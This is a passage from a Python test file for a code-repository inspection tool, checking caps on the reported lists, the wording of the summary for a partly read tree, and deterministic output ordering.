    assert len(data["dependencies"]) == inspection.MAX_DEPENDENCIES
    assert len(data["testCommands"]) == inspection.MAX_COMMANDS
    assert len(data["buildCommands"]) == inspection.MAX_COMMANDS
    assert len(data["entryPoints"]) == inspection.MAX_ENTRY_POINTS
    assert len(data["modules"]) == inspection.MAX_MODULES
    assert len(data["documentation"]) == inspection.MAX_DOCUMENTS
    assert (
        "Its manifests declare 1,000 dependencies, listed here as declared and "
        "not checked against security advisories. The first 300 are listed."
    ) in found.summary
    # What the page keys its lists by has to be unique.
    for key, field in (("entryPoints", "path"), ("modules", "path")):
        values = [item[field] for item in data[key]]
        assert len(values) == len(set(values))


def test_a_tree_larger_than_the_limit_is_read_in_part_and_says_so(
    tmp_path: Path,
) -> None:
    root = tree(tmp_path, {f"src/f{number:03}.py": "x" * 10 for number in range(30)})
    found = inspect_tree(root, max_files=12)
    assert found.summary.startswith(
        "12 files at this commit, with 120 bytes of code in 1 language, "
        "mostly Python (100%). Only the first 12 files were read; the rest "
        "are not counted here."
    )


def test_the_same_tree_reads_the_same_twice(tmp_path: Path) -> None:
    files = {
        "package.json": package(
            scripts={"test": "x"}, dependencies={"b": "1", "a": "2", "next": "3"}
        ),
        "z/one.ts": "x" * 10,
        "a/two.py": "x" * 10,
        "m/three.go": "x" * 10,
        "README.md": "# Thing\n",
    }
    first = inspect(tmp_path / "one", files)
    second = inspect(tmp_path / "two", dict(reversed(list(files.items()))))
    assert first == second
    # Equal shares are ordered by name, so the order is not left to chance.
    assert [language["name"] for language in first.languages] == [
        "Go",
        "Python",
        "TypeScript",
    ]
